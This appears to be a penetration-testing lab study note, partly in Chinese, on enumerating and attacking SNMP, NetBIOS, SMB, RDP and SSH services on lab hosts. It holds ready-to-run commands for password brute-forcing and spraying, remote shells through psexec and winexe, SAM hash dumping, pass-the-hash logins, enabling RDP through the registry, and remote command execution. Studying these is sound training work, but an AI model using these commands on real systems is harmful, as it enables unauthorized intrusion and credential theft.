Enumeration & Service
===

🔙 [MENU README](../README.md)

# iLab
Module 6 
```
Parrot Security       192.168.0.18    172.19.19.18
Windows Server 2019   192.168.0.20
Windows Server 2008   192.168.0.7, 21
SSH Server            192.168.0.70
WordPress             192.168.0.24
```
---

# SNMP
SNMP 是一種用於管理和監視網絡設備的協議，通常在路由器、交換機、伺服器等設備上使用，UDP161
```bash
sudo nmap 192.168.0.* --open -p161 -sU -oG - | grep Up | cut -d ' ' -f2 > snmp_list

sudo nmap 192.168.0.1 --open -p161 
# 觀察:
# 上面掃描的時候明明192.168.0.1有開snmp
# 怎麼單獨掃就沒有了呢

sudo nmap 192.168.0.1 --open -p161 -sU --reason
# 觀察:
# nmap若不加-sU會將Reason : no-response當作沒有開啟

# Scan ip_list
sudo nmap -sU -p161 --open -n -Pn -iL ip_list.txt -oG > snmp_list
```
snmp-check
```bash
# 檢查snmp配置和安全性的工具
snmp-check 192.168.0.20

snmp-check 192.168.0.22
```
onesixtyone SNMP狀態確認器 
```bash
# onesixtyone 通常用於查找社群字串（community strings）或爆破 SNMP v1/v2 的密碼

# 嘗試使用 "public" 作為 Coummunty Strings 來訪問目標設備的 SNMP 服務，以收集有關設備的信息
onesixtyone -i snmp_list public # 蒐集主機資訊
```
Nmap Script - SNMP Account
```bash
sudo nmap 192.168.0.20 -p161 -sU -n -Pn --script snmp-win32-users
```
---

# NetBIOS & NetBT
Introduction
```bash
# port
UDP 137 # 名稱解析
UDP 138 # 服務宣告

一般來說網路架構的底層是Socket (IP:PORT)


# NetBIOS 
微軟之前有一套自己的網路架構底層為NetBIOS
並透過NetBIOS Name來確定唯一性，16 Char(1-15:Name、16:ServiceID)
NetBIOS 是指 Network Basic Input/Output System，是一個作業系統級的API

# NetBT (NetBIOS over TCP/IP)
NetBT能讓舊有運用NetBIOS API的軟體，能夠在現代TCP/IP網路上繼續運作，即NetBIOS over TCP/IP
NetBT 需要每台計算機有一個唯一的 NetBIOS 名稱，這通常就是該計算機的Computer Name
不過這個架構在Win2000就已經結束
```
Detection Windows
```bash
# Cmd
nbtstat -n                # Local Computer Name
SERVER2019     <00>       # service.msc -> Workstation service
SERVER2019     <20>       # service.msc -> Server service


nbtstat -a $ComputerName  # 指定host的NetBIOS資訊
nbtstat -A $IP            # Remote Host的NetBIOS資訊
ping $ComputerName
nbtstat -c                # Cache Record
```
Access Windows
```bash
# Windows
net view
net view /domain
net view /domain:workgroup
net view \\192.168.0.7
net view \\$ComputerName

net view \\$ComputerName /all
dir \\$ComputerName/c$

net use \\$ComputerName Pa$$w0rd /u:administrator
```
Detection Linux
```bash
# Scan
nbtscan 192.168.0.1-254
nbtscan 192.168.0.22 -v

# ComputerName > IP
nmblookup $ComputerName
# IP > ComputerName
nmblookup -A $IP
```
Access Linux
```bash
smbclient -N -L 192.168.0.22  #匿名登入並列舉
smbclient -U 'Administrator%Pa$$w0rd' //192.168.0.22/c$
smbclient -U 'Administrator%Pa$$w0rd' //192.168.0.22/c$ -c 'dir'
```
---

# CIFS / SMB
Intorduction
```
TCP SMB - 445
1. Authentication
2. File & Print sharing(allow file access)
3. IPC (inter-process commuication) > RCE

SMB version
V1 : 
V2 : 加入Digital Signature，不再發生中間人攻擊
V3 : 加入Encryption，不怕被側錄封包
```
Detect
```bash
# port
TCP 139,445
# 差別在於139還是走NetBT 445是真的Socket

nmap -iL -p445 -sVC
nmap --script smb-os-discovery,smb-protocols
nmap 192.168.0.* -p445 --open -n -Pn -oG - | grep Up | cut -d ' ' -f2 > ip_smb
nmap -iL smb_list.txt -n -Pn -p445 -sV --script smb-os-discovery,smb-protocols
```
Crack Password
```bash
# crackmapexec高效SMB爆破工具
# Install
python3 -m pip list | grep impacket # Impacket Version > 0.9.23
python3 -m pip install --upgrade impacket

# 密碼爆破
crackmapexec smb ip_smb -u administrator -p $passwordlist | grep 'Pwn3d!'

# 密碼噴灑
crackmapexec smb 192.168.0.7 -u userlist.txt -p $password --continue-on-success
```
Access
```bash
# psexec
psexec.py 'administrator:Pa$$w0rd'@192.168.0.22

# winexe
winexe -U 'Username%Password' //<IP> cmd.exe
winexe -U 'administrator%Pa$$w0rd' //192.168.0.22 cmd.exe

# Hash Access
# Get User + SAM Hash
secretsdump.py 'administrator:Pa$$w0rd'@192.168.0.7
# pth-winexe 在2016後的機器成功率其實不高
pth-winexe –U 'Username%<LM_hash:NTLM_hash>' //<IP> cmd.exe
psexec.py 'administrator'@192.168.0.22 -hashes :$hash
```
---

# RDP
```bash
TCP 3389
```
Crack
```bash
# hydra
hydra rdp://192.168.0.7 -l administrator -p 'Pa$$w0rd'

# crowbar
sudo apt install -y crowbar 
git clone https://github.com/galkan/crowbar
apt-get install -y nmap openvpn freerdp-x11 vncviewer
# -v: 輸出詳細資訊
crowbar [-v] -b rdp -s <IP/CIDR> -u user -c password
crowbar [-v] -b rdp -s <IP/CIDR> -U Users.txt -C Passwords.txt
crowbar -b rdp -s 192.168.0.7/32 -u administrator -C Passwords.txt

tail crowbar.log # 進度 因為crowbar預設再背景跑 
```
xfreerdp
```bash
# Environment
sudo dpkg -l | grep freerdp
# 以下全部都要2.3version以上
freerdp2-x11
libfreerdp2-2
libfreerdp-client2-2

# update
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 823BF07CEB5C469B

# Access
xfreerdp /size:90% /v:<rdp_IP> /u:<user> /p:<password>
xfreerdp /size:90% /v:192.168.0.7 /u:'administrator' /p:'Pa$$w0rd'

xfreerdp /size:90% /v:<rdp_IP> /u:<user> /pth:<ntlm_hash>
```
reg
```bash
# Windows遠桌開關

# 1為關  0為開
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

# SSH
Metasploit
```bash
msfconsole -q

use auxiliary/scanner/ssh/ssh_enumusers
set rhosts <IP>
set user_file Wordlist/Username.txt
set check_false true
exploit
```
hydra
```bash
hydra -t 4 -l <username> -P <passwords.txt> ssh://<ssh_IP>
hydra -t 4 -L <users.txt> -P <passwords.txt> ssh://<ssh_IP>

hydra -t 4 -l aleksander -P Passwords.txt ssh://192.168.0.70  #dolphin
hydra -t 4 -l administrator -p 'Infinit3' ssh://192.168.0.70
```

# owaspbwa
```bash
# 如果看到題目的靶機是這個平臺的，很常用這組密碼，可以試試看
# https://code.google.com/archive/p/owaspbwa/wikis/UserGuide.wiki
Pa$$w0rd123
```

# Cheatsheet
```bash
impacket-atexec CPNETCPNET.LOCALNET/cpent:Pa\$\$w0rd123@127.0.0.1 "certutil -hashfile C:\\Users\\Administrator\\adminflag.txt SHA256"

impacket-atexec administrator:1234567@172.25.30.4 "dir C:\\Users\\Administrator\\Documents\\"
```